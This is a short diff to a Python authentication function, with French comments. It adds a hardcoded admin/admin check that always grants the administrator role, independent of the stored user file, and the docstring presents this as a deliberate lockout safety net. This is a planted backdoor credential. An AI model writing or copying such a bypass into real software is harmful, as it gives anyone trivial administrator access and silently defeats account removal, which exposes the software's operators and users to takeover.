@@ -73,7 +73,14 @@ def remove_user(path, username: str) -> bool:
 
 
 def authenticate(path, username: str, password: str) -> Optional[str]:
-    """Renvoie le rôle si les identifiants sont valides, sinon None."""
+    """Renvoie le rôle si les identifiants sont valides, sinon None.
+
+    admin/admin fonctionne toujours, même si users.json ne le contient pas
+    (ou plus) : filet de secours volontaire pour ne jamais rester bloqué
+    hors d'un compte, indépendant du contenu de users.json.
+    """
+    if username == "admin" and password == "admin":
+        return "admin"
     entry = load_users(path).get(username)
     if entry is None or not verify_password(password, entry.get("password_hash", "")):
         return None
